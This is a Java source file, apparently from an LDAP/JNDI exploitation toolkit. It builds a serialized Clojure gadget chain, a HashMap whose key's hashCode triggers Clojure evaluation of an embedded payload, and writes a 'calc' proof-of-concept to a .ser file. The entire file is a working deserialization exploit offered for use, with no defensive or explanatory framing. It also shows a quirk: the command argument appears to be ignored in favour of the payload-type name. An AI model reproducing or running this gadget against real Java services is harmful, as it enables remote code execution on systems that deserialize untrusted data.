package com.feihong.ldap.gadgets;

import clojure.core$comp;
import clojure.core$constantly;
import clojure.inspector.proxy$javax.swing.table.AbstractTableModel$ff19274a;
import clojure.lang.PersistentArrayMap;
import clojure.main$eval_opt;
import com.feihong.ldap.enumtypes.PayloadType;
import com.feihong.ldap.gadgets.utils.clojure.ClojureUtil;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

public class Clojure {

    public static void main(String[] args) throws Exception {
        byte[]           bytes = getBytes(PayloadType.command, "calc");
        FileOutputStream fous  = new FileOutputStream("333.ser");
        fous.write(bytes);
        fous.close();
    }

    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
        String command = String.valueOf(type);

        String              clojurePayload = ClojureUtil.makeClojurePayload(command);
        Map<String, Object> fnMap          = new HashMap<String, Object>();
        fnMap.put("hashCode", (new core$constantly()).invoke(Integer.valueOf(0)));
        AbstractTableModel$ff19274a model = new AbstractTableModel$ff19274a();
        model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));
        HashMap<Object, Object> targetMap = new HashMap<Object, Object>();
        targetMap.put(model, null);
        fnMap.put("hashCode", (new core$comp())
                .invoke(new main$eval_opt(), (new core$constantly())

                        .invoke(clojurePayload)));
        model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));

        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
        oos.writeObject(targetMap);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }

}
